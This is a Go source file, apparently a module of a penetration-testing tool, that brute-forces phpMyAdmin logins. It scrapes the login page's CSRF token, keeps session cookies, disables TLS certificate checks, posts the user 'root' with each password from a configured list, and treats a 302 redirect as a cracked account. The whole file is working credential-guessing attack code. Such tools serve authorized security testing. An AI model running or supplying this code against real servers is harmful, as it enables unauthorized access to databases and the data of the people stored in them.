package crackmodule

import (
	"bufio"
	"crypto/tls"
	"cube/config"
	"cube/gologger"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
)

type Phpmyadmin struct {
	*Crack
}

func (p Phpmyadmin) CrackName() string {
	return "phpmyadmin"
}

func (p Phpmyadmin) CrackPort() string {
	return "80"
}

func (p Phpmyadmin) CrackAuthUser() []string {
	return []string{"root"}
}

func (p Phpmyadmin) CrackAuthPass() []string {
	return config.PASSWORDS
}

func (p Phpmyadmin) IsMutex() bool {
	return true
}

func (p Phpmyadmin) CrackPortCheck() bool {
	return false
}

func (p Phpmyadmin) Exec() CrackResult {
	result := CrackResult{Crack: *p.Crack, Result: false, Err: nil}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	clt := http.Client{Transport: tr}
	if !strings.HasPrefix(p.Ip, "http") {
		gologger.Errorf("Invalid URL, eg: http://%s", p.Ip)
	}
	req, _ := http.NewRequest("GET", p.Ip, nil)
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req.Header.Add("Connection", "close")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9")
	req.Header.Add("Accept-Charset", "utf-8")
	resp, err := clt.Do(req)
	if err != nil {
		log.Printf("Error making request: %v", err)
		return result
	}

	data := make([]byte, 20250)
	c := bufio.NewReader(resp.Body)
	c.Read(data)
	resp.Body.Close()
	//content, _ := ioutil.ReadAll(resp.Body)
	r := regexp.MustCompile(`(?U)name="token" value="(.*)"`)
	match := r.FindStringSubmatch(string(data))
	if match == nil {
		return result
	}
	token := strings.TrimSpace(match[1])

	jar, _ := cookiejar.New(nil)
	host, _ := url.Parse(p.Ip)
	jar.SetCookies(host, resp.Cookies())
	crackClt := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Jar:       jar,
		Transport: tr}

	//fmt.Println(jar.Cookies(host))

	urlValues := url.Values{}
	urlValues.Add("pma_username", p.Auth.User)
	urlValues.Add("pma_password", p.Auth.Password)
	urlValues.Add("pma_lang", "zh_CN")
	urlValues.Add("server", "1")
	urlValues.Add("token", token)

	body := strings.NewReader(urlValues.Encode())
	req2, _ := http.NewRequest("POST", p.Ip, body)
	req2.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req2.Header.Add("Connection", "close")
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp2, err := crackClt.Do(req2)
	if err != nil {
		// 处理请求错误
		log.Printf("Error making request: %v", err)
		// 应该在这里返回或处理错误
		return result
	}

	if resp2 != nil {
		defer func() {
			// 使用 defer 调用匿名函数来处理 Close 的错误
			if err := resp2.Body.Close(); err != nil {
				// 处理关闭 resp.Body 时的错误
				log.Printf("Error closing response body: %v", err)
			}
		}()

		if resp2.StatusCode == 302 {
			result.Result = true
		}
	} else {
		// 如果到这里，说明有严重的错误发生，resp2 应该不为 nil。
		log.Printf("Response is nil without a preceding error.")
	}

	return result
}

func init() {
	AddCrackKeys("phpmyadmin")
}
